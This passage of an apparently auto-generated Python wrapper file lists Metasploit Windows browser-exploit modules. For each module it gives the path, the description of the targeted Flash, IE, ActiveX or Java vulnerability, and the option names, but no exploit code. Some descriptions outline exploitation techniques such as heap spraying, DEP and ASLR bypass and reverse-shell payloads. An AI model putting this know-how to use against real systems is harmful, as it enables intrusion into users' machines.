			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_adobe_flash_sps(object):
		"""
		
          This module exploits a vulnerability found in Adobe Flash Player's Flash10u.ocx
        component.  When processing a MP4 file (specifically the Sequence Parameter Set),
        Flash will see if pic_order_cnt_type is equal to 1, which sets the
        num_ref_frames_in_pic_order_cnt_cycle field, and then blindly copies data in
        offset_for_ref_frame on the stack, which allows arbitrary remote code execution
        under the context of the user.  Numerous reports also indicate that this
        vulnerability has been exploited in the wild.
      
		"""

		path = 'windows/browser/adobe_flash_sps'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_yahoomessenger_fvcom(object):
		"""
		
          This module exploits a stack buffer overflow in the Yahoo! Messenger ActiveX
        Control (YVerInfo.dll <= 2006.8.24.1). By sending a overly long string
        to the "fvCom()" method from a yahoo.com domain, an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/browser/yahoomessenger_fvcom'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_042_helpctr_xss_cmd_exec(object):
		"""
		
          Help and Support Center is the default application provided to access online
        documentation for Microsoft Windows. Microsoft supports accessing help documents
        directly via URLs by installing a protocol handler for the scheme "hcp". Due to
        an error in validation of input to hcp:// combined with a local cross site
        scripting vulnerability and a specialized mechanism to launch the XSS trigger,
        arbitrary command execution can be achieved.

        On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it
        can be used to launch the exploit automatically. If IE8 and WMP11, either can
        be used to launch the attack, but both pop dialog boxes asking the user if
        execution should continue. This exploit detects if non-intrusive mechanisms are
        available and will use one if possible. In the case of both IE8 and WMP11, the
        exploit defaults to using an iframe on IE8, but is configurable by setting the
        DIALOGMECH option to "none" or "player".

        This module creates a WebDAV service from which the payload is copied to the
        victim machine.
      
		"""

		path = 'windows/browser/ms10_042_helpctr_xss_cmd_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DIALOGMECH = 'DIALOGMECH'

	class windows_browser_ms05_054_onload(object):
		"""
		
        This bug is triggered when the browser handles a JavaScript 'onLoad' handler in
        conjunction with an improperly initialized 'window()' JavaScript function.
        This exploit results in a call to an address lower than the heap. The javascript
        prompt() places our shellcode near where the call operand points to.  We call
        prompt() multiple times in separate iframes to place our return address.
        We hide the prompts in a popup window behind the main window. We spray the heap
        a second time with our shellcode and point the return address to the heap. I use
        a fairly high address to make this exploit more reliable. IE will crash when the
        exploit completes.  Also, please note that Internet Explorer must allow popups
        in order to continue exploitation.
      
		"""

		path = 'windows/browser/ms05_054_onload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_codebase_trust(object):
		"""
		
          This module exploits a vulnerability in the Java Runtime Environment
        that allows an attacker to run an applet outside of the Java Sandbox. When
        an applet is invoked with:

        1. A "codebase" parameter that points at a trusted directory
        2. A "code" parameter that is a URL that does not contain any dots

        the applet will run outside of the sandbox.

        This vulnerability affects JRE prior to version 6 update 24.
      
		"""

		path = 'windows/browser/java_codebase_trust'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			LIBPATH = 'LIBPATH'

	class windows_browser_ms12_037_same_id(object):
		"""
		
          This module exploits a memory corruption flaw in Internet Explorer 8 when
        handling objects with the same ID property. At the moment this module targets
        IE8 over Windows XP SP3 and Windows 7. This module supports heap massaging
        as well as the heap spray method seen in the wild (Java msvcrt71.dll).
      
		"""

		path = 'windows/browser/ms12_037_same_id'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_adobe_flash_domain_memory_uaf(object):
		"""
		
        This module exploits a use-after-free vulnerability in Adobe Flash Player. The
        vulnerability occurs when the ByteArray assigned to the current ApplicationDomain
        is freed from an ActionScript worker, when forcing a reallocation by copying more
        contents than the original capacity, but Flash forgets to update the domainMemory
        pointer, leading to a use-after-free situation when the main worker references the
        domainMemory again. This module has been tested successfully on Windows 7 SP1
        (32-bit), IE 8 and IE11 with Flash 17.0.0.134.
      
		"""

		path = 'windows/browser/adobe_flash_domain_memory_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_ms13_055_canchor(object):
		"""
		
        In IE8 standards mode, it's possible to cause a use-after-free condition by first
        creating an illogical table tree, where a CPhraseElement comes after CTableRow,
        with the final node being a sub table element. When the CPhraseElement's outer
        content is reset by using either outerText or outerHTML through an event handler,
        this triggers a free of its child element (in this case, a CAnchorElement, but
        some other objects apply too), but a reference is still kept in function
        SRunPointer::SpanQualifier. This function will then pass on the invalid reference
        to the next functions, eventually used in mshtml!CElement::Doc when it's trying to
        make a call to the object's SecurityContext virtual function at offset +0x70, which
        results a crash. An attacker can take advantage of this by first creating an
        CAnchorElement object, let it free, and then replace the freed memory with another
        fake object. Successfully doing so may allow arbitrary code execution under the
        context of the user.

        This bug is specific to Internet Explorer 8 only. It was originally discovered by
        Jose Antonio Vazquez Gonzalez and reported to iDefense, but was discovered again
        by Orange Tsai at Hitcon 2013.
      
		"""

		path = 'windows/browser/ms13_055_canchor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_hp_loadrunner_writefilebinary(object):
		"""
		
        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed
        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileBinary method
        where user provided data is used as a memory pointer.  This module has been tested
        successfully on IE6-IE9 on Windows XP, Vista and 7, using the LrWebIERREWrapper.dll
        11.50.2216.0. In order to bypass ASLR the no aslr compatible module msvcr71.dll is
        used. This one is installed with HP LoadRunner.
      
		"""

		path = 'windows/browser/hp_loadrunner_writefilebinary'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_symantec_altirisdeployment_downloadandinstall(object):
		"""
		
          This module allows remote attackers to install and execute arbitrary files on a users file system via
        AeXNSPkgDLLib.dll (6.0.0.1418). This module was tested against Symantec Altiris Deployment Solution 6.9 sp3.
      
		"""

		path = 'windows/browser/symantec_altirisdeployment_downloadandinstall'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_browser_malwarebytes_update_exec(object):
		"""
		
        This module exploits a vulnerability in the update functionality of
        Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes
        Anti-Exploit consumer 1.03.1.1220.
        Due to the lack of proper update package validation, a man-in-the-middle
        (MITM) attacker could execute arbitrary code by spoofing the update server
        data-cdn.mbamupdates.com and uploading an executable. This module has
        been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.
      
		"""

		path = 'windows/browser/malwarebytes_update_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_browser_cisco_playerpt_setsource(object):
		"""
		
          This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15
        as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ
        Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in
        the SetSource method, allows to trigger a stack based buffer overflow which leads
        to code execution under the context of the user visiting a malicious web page.
      
		"""

		path = 'windows/browser/cisco_playerpt_setsource'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_amaya_bdo(object):
		"""
		
          This module exploits a stack buffer overflow in the Amaya v11 Browser.
          By sending an overly long string to the "bdo"
          tag, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/amaya_bdo'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms03_020_ie_objecttype(object):
		"""
		
          This module exploits a vulnerability in Internet Explorer's
        handling of the OBJECT type attribute.
      
		"""

		path = 'windows/browser/ms03_020_ie_objecttype'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_yahoomessenger_server(object):
		"""
		
          This module exploits a stack buffer overflow in the Yahoo! Webcam Upload ActiveX
        Control (ywcupl.dll) provided by Yahoo! Messenger version 8.1.0.249.
        By sending a overly long string to the "Server()" method, and then calling
        the "Send()" method, an attacker may be able to execute arbitrary code.
        Using the payloads "windows/shell_bind_tcp" and "windows/shell_reverse_tcp"
        yield for the best results.
      
		"""

		path = 'windows/browser/yahoomessenger_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_tom_sawyer_tsgetx71ex552(object):
		"""
		
          This module exploits a remote code execution vulnerability in the tsgetx71ex553.dll
        ActiveX control installed with Tom Sawyer GET Extension Factory due to an incorrect
        initialization under Internet Explorer.

        While the Tom Sawyer GET Extension Factory is installed with some versions of  VMware
        Infrastructure Client, this module has been tested only with the versions installed
        with Embarcadero Technologies ER/Studio XE2 / Embarcadero Studio Portal 1.6. The ActiveX
        control tested is tsgetx71ex553.dll, version 5.5.3.238.

        This module achieves DEP and ASLR bypass using the well known msvcr71.dll rop chain. The
        dll is installed by default with the Embarcadero software, and loaded by the targeted
        ActiveX.
      
		"""

		path = 'windows/browser/tom_sawyer_tsgetx71ex552'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_adobe_flash_rtmp(object):
		"""
		
        This module exploits a vulnerability found in Adobe Flash
        Player.  By supplying a corrupt AMF0 "_error" response, it
        is possible to gain arbitrary remote code execution under
        the context of the user.

        This vulnerability has been exploited in the wild as part of
        the "World Uyghur Congress Invitation.doc" e-mail attack.
        According to the advisory, 10.3.183.19 and 11.x before
        11.2.202.235 are affected.
      
		"""

		path = 'windows/browser/adobe_flash_rtmp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'
			required_RTMPHOST = 'RTMPHOST'
			required_RTMPPORT = 'RTMPPORT'

	class windows_browser_ms06_055_vml_method(object):
		"""
		
          This module exploits a code execution vulnerability in Microsoft Internet Explorer using
        a buffer overflow in the VML processing code (VGX.dll). This module has been tested on
        Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.
      
		"""

		path = 'windows/browser/ms06_055_vml_method'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_orbit_connecting(object):
		"""
		
